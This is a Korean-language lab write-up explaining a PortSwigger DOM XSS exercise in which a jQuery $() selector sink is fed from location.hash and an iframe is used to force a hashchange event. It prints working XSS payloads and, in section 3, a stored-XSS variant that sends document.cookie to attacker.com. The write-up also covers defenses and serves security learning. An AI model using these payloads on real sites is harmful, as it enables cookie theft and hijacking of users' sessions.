# Lab: DOM XSS in jQuery selector sink using a hashchange event

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — DOM-based / jQuery `$()` selector sink / hashchange
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

## 목표

홈 페이지의 jQuery `$()` selector sink에 DOM XSS를 삽입하여 `print()` 함수를 실행시킨다.

## 취약점 분석

페이지 내 JavaScript:

```javascript
$(window).on('hashchange', function() {
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(location.hash.slice(1)) + ')');
    post.get(0).scrollIntoView();
});
```

- **Source**: `location.hash` — URL의 `#` 이후 값
- **Sink**: `$()` — jQuery selector 함수

URL 해시값을 읽어 블로그 포스트를 찾아 스크롤하는 기능이다.  
문제는 jQuery `$()` 에 `<` 로 시작하는 문자열이 들어오면 **셀렉터가 아니라 HTML 요소 생성**으로 해석한다는 점이다.

```javascript
// 셀렉터로 사용 (의도된 동작)
$('h2:contains(Hello)')   → h2 태그에서 Hello를 찾음

// HTML 생성으로 해석 (취약점)
$('<img src=x onerror=print()>')  → img 요소를 생성하고 DOM에 삽입
```

## `hashchange` 이벤트의 특성

`hashchange` 이벤트는 URL의 `#` 부분이 **변경될 때** 발생한다.

```
https://example.com/          → hashchange 미발생
https://example.com/#hello    → 직접 접근 시 hashchange 미발생 (초기 로드)
https://example.com/#hello → #world 변경 시 → hashchange 발생
```

**핵심**: 페이지 최초 로드 시에는 hashchange가 발생하지 않는다.  
따라서 `https://victim.com/#<img src=x onerror=print()>` 로 직접 접근하면 공격이 발동하지 않는다.

## 공격 방법 — iframe으로 hashchange 강제 유발

피해자 페이지를 iframe에 로드한 뒤, `onload` 시점에 hash를 변경하면 hashchange 이벤트가 발생한다.

```html
<iframe
  src="https://TARGET-URL/#"
  onload="this.src+='<img src=x onerror=print()>'"
>
</iframe>
```

동작 순서:

```
1. iframe이 TARGET-URL/# 을 로드 (hash는 빈 값)
        ↓
2. iframe onload 발화
   → this.src += '<img src=x onerror=print()>'
   → src가 TARGET-URL/#<img src=x onerror=print()> 로 변경
        ↓
3. hash 변경 → hashchange 이벤트 발생
        ↓
4. jQuery $('<img src=x onerror=print()>') 실행
   → img 요소 생성 및 DOM 삽입
        ↓
5. src=x 로드 실패 → onerror 발화 → print() 실행
```

## 005 랩과의 비교

| 항목 | 005 (href sink) | 006 (jQuery $() sink) |
|------|-----------------|----------------------|
| Sink | `.attr("href", ...)` | `$()` selector |
| Source | `location.search` | `location.hash` |
| 페이로드 | `javascript:alert(...)` | `<img src=x onerror=...>` |
| 실행 조건 | 링크 클릭 | iframe으로 hashchange 유발 |
| 서버 전송 | O (쿼리스트링) | **X** (hash는 서버 미전송) |

## 왜 `print()`인가

PortSwigger 랩에서 `alert()` 대신 `print()`를 요구하는 경우가 있다.  
실제 공격에서는 둘 다 동일하게 임의 JS 실행을 증명하는 PoC 함수다.

```javascript
alert(1)    // 팝업 — 브라우저 자동화 도구가 차단하는 경우 있음
print()     // 인쇄 다이얼로그 — 자동화 환경에서도 발동 확인 가능
confirm(1)  // 확인/취소 팝업
prompt(1)   // 입력 팝업
```

## 핵심 정리

- jQuery `$()` 는 인자가 `<` 로 시작하면 HTML 파싱 후 DOM 요소를 생성한다 — 사용자 입력이 들어오면 XSS sink가 된다.
- `hashchange` 이벤트는 초기 로드 시 발생하지 않으므로, iframe으로 hash를 동적으로 변경하여 이벤트를 강제 유발해야 한다.
- `location.hash` 는 서버에 전송되지 않아 WAF 우회에 유리하다 (003 랩에서 학습한 내용).
- **방어**:
  - jQuery `$()` 에 사용자 입력 직접 전달 금지
  - `location.hash` 값 사용 전 화이트리스트 검증
  - CSP로 인라인 이벤트 핸들러 차단

## 배운 점 및 추가 학습

### 1. jQuery `$()` 의 이중 동작

jQuery의 `$()` 함수는 인자의 형태에 따라 전혀 다르게 동작한다.

```javascript
// 1. CSS 셀렉터 — 기존 DOM 검색
$('.class')        // class 요소 찾기
$('#id h2')        // id 안의 h2 찾기

// 2. HTML 문자열 — 새 DOM 요소 생성 (위험!)
$('<div>')         // div 요소 생성
$('<img src=x onerror=alert(1)>')  // XSS!

// 3. 함수 — DOMContentLoaded 콜백
$(function() { ... })
```

`$('h2:contains(' + userInput + ')')` 처럼 셀렉터 안에 사용자 입력이 들어가면,  
`userInput`이 `<img ...>` 형태일 때 `$('<img ...>')` 로 해석되어 HTML 생성 경로로 빠진다.

### 2. 이벤트 기반 취약점 공격의 일반 패턴

`hashchange` 처럼 특정 이벤트가 발생해야만 실행되는 취약점은 직접 URL 접근으로는 트리거되지 않는다.  
이를 우회하는 일반적인 방법:

| 방법 | 설명 |
|------|------|
| `<iframe onload>` | 로드 후 src 변경으로 이벤트 재유발 |
| `<a href>` 클릭 유도 | 링크 클릭으로 hash 변경 유발 |
| `window.open()` | 새 창 열고 hash 조작 |
| `history.pushState()` | URL 변경으로 popstate 이벤트 유발 |

### 3. Stored XSS로 발전시키기

이 공격을 댓글, 프로필 등 저장 가능한 필드에 넣을 수 있다면 Stored XSS로 확장된다.

```html
<!-- 댓글에 저장된 공격 payload -->
<iframe src="https://victim.com/#" onload="this.src+='<img src=x onerror=fetch(`https://attacker.com/?c=`+document.cookie)>'"></iframe>
```

해당 댓글 페이지를 방문하는 모든 사용자가 victim.com의 쿠키를 공격자 서버로 전송하게 된다.

### 4. jQuery 버전과 보안

jQuery 3.0 이후 `$()` 의 HTML 파싱 동작이 일부 제한되었지만, 완전히 차단되지는 않았다.  
jQuery 버전과 관계없이 사용자 입력을 `$()` 에 직접 전달하는 패턴 자체를 피해야 한다.

```javascript
// 위험한 패턴 — jQuery 버전 무관
var hash = location.hash.slice(1);
$('h2:contains(' + hash + ')');      // hash가 <img...>이면 HTML 생성

// 안전한 패턴
var hash = decodeURIComponent(location.hash.slice(1));
// HTML 특수문자 이스케이프 후 셀렉터로만 사용
var escaped = hash.replace(/[<>"'&]/g, '');
$('h2:contains(' + escaped + ')');
```
